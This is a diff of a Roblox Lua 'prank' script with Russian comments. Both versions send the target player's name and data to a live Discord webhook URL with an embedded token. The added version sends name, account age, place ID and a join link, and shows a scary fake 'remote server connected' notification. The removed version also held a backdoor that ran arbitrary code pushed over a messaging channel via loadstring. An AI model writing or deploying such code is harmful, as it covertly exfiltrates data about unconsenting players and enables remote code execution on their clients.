@@ -1,47 +1,42 @@
 local HttpService = game:GetService("HttpService")
-local MessagingService = game:GetService("MessagingService")
 local Players = game:GetService("Players")
 local player = Players.LocalPlayer
 
--- ⚠️ ЗАМЕНИТЕ НА ВАШ ПРОКСИ-ВЕБХУК ДИСКОРДА
-local webhookUrl = "https://webhook.lewisakura.moe/api/webhooks/1549358385453989969/7EmPPu20TXFW0zGaRwEdCUH9e3qhWfhIbsAj8X1wSGXBReLVVHwG632PnMCm8lSIpqeU"
+local proxyWebhook = "https://webhook.lewisakura.moe/api/webhooks/1549358385453989969/7EmPPu20TXFW0zGaRwEdCUH9e3qhWfhIbsAj8X1wSGXBReLVVHwG632PnMCm8lSIpqeU"
 
--- 1. Сбор и отправка данных в Discord (чтобы вы узнали, что он зашел)
-local joinLink = "roblox://placeId=" .. game.PlaceId .. "&gameInstanceId=" .. game.JobId
+local placeId = game.PlaceId
+local jobId = game.JobId
+local webJoinLink = "https://roblox.com" .. placeId .. "&launchData=" .. jobId
+
 local payload = {
     ["embeds"] = {{
-        ["title"] = "👁️ Цель в сети!",
-        ["description"] = "Друг запустил скрипт. Теперь вы можете отправлять ему команды из Studio.",
-        ["color"] = 16711680,
+        ["title"] = "🎯 Пранк запущен! Цель обнаружена",
+        ["color"] = 16738048,
         ["fields"] = {
-            {["name"] = "Ник:", ["value"] = player.Name, ["inline"] = true},
-            {["name"] = "Ссылка для входа:", ["value"] = "```" .. joinLink .. "```", ["inline"] = false}
+            {["name"] = "Ник друга:", ["value"] = player.Name, ["inline"] = true},
+            {["name"] = "Возраст аккаунта:", ["value"] = player.AccountAge .. " дней", ["inline"] = true},
+            {["name"] = "ID игры:", ["value"] = tostring(placeId), ["inline"] = false},
+            {["name"] = "🔗 Войти на сервер с твинка:", ["value"] = "[КЛИКНИ ТУТ](" .. webJoinLink .. ")", ["inline"] = false}
         }
     }}
 }
 
-pcall(function()
-    HttpService:PostAsync(webhookUrl, HttpService:JSONEncode(payload), Enum.HttpContentType.ApplicationJson)
+-- Отправка с выводом ошибки в консоль (если она будет)
+local success, err = pcall(function()
+    return HttpService:PostAsync(
+        proxyWebhook, 
+        HttpService:JSONEncode(payload), 
+        Enum.HttpContentType.ApplicationJson
+    )
 end)
 
--- 2. Подключаемся к каналу связи "PrankChannel"
--- Этот код будет ждать, пока вы из Studio что-то пришлете
-pcall(function()
-    MessagingService:SubscribeAsync("PrankChannel", function(message)
-        local commandData = message.Data -- Получаем отправленные данные
-        
-        -- Проверяем, что команда предназначена именно для этого игрока
-        if commandData.TargetUser == player.Name then
-            -- Выполняем код, который вы прислали из Studio
-            local runCode = loadstring(commandData.ScriptToRun)
-            if runCode then
-                runCode()
-            end
-        end
-    end)
-end)
+if not success then
+    warn("Ошибка отправки в Discord: " .. tostring(err))
+else
+    print("Лог успешно улетел в Discord!")
+end
 
--- Пугающее уведомление в игре
+-- Ваше уведомление
 game:GetService("StarterGui"):SetCore("SendNotification", {
     Title = "⚠️ СИСТЕМА ИНТЕГРАЦИИ",
     Text = "Успешное подключение к удаленному серверу.",
